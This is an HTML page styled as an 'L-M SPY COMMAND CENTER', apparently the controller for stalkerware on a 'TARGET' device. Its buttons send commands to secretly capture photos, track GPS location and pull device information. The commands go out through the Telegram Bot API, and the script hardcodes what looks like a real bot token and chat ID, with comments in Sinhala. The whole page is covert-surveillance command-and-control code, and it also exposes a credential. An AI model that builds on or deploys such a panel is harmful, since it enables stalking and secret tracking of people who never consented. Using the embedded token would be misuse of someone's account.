<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>L-M SPY COMMAND CENTER</title>
    <style>
        /* Matrix/Hacker Style CSS */
        body {
            background-color: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .dashboard {
            border: 2px solid #00ff41;
            padding: 30px;
            background: rgba(0, 50, 0, 0.1);
            box-shadow: 0 0 20px #00ff41;
            text-align: center;
            width: 350px;
        }

        h1 {
            font-size: 22px;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #00ff41;
        }

        .status-box {
            border: 1px solid #00ff41;
            padding: 10px;
            margin-bottom: 20px;
            font-size: 14px;
            background: #000;
        }

        .btn {
            background: transparent;
            border: 1px solid #00ff41;
            color: #00ff41;
            padding: 12px;
            margin: 10px 0;
            width: 100%;
            cursor: pointer;
            font-size: 16px;
            text-transform: uppercase;
            transition: 0.3s;
        }

        .btn:hover {
            background: #00ff41;
            color: #000;
            box-shadow: 0 0 15px #00ff41;
        }

        #log {
            font-size: 12px;
            margin-top: 20px;
            color: #aaa;
            height: 50px;
            overflow-y: auto;
        }
    </style>
</head>
<body>

<div class="dashboard">
    <h1>[ L-M CONTROL PANEL ]</h1>
    
    <div class="status-box">
        SYSTEM: <span id="sys-status">STABLE</span><br>
        TARGET: <span style="color: red;">CONNECTED</span>
    </div>

    <button class="btn" onclick="sendCommand('PHOTO')">📸 Capture Secret Photo</button>
    <button class="btn" onclick="sendCommand('LOCATION')">📍 Track GPS Location</button>
    <button class="btn" onclick="sendCommand('INFO')">🔍 Device System Info</button>

    <div id="log">> Waiting for command...</div>
</div>

<script>
    // ඔයාගේ Telegram තොරතුරු
    const BOT_TOKEN = '8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI';
    const CHAT_ID = '7883989086';

    async function sendCommand(type) {
        const log = document.getElementById('log');
        log.innerText = `> Executing ${type} command...`;
        
        // Telegram Bot හරහා විධානය යැවීම
        const message = `CMD_${type}`;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;

        try {
            const response = await fetch(url);
            if (response.ok) {
                log.innerText = `> ${type} command sent to device.`;
            } else {
                log.innerText = `> Error sending command!`;
            }
        } catch (error) {
            log.innerText = `> Connection failed.`;
        }
    }
</script>

</body>
</html>
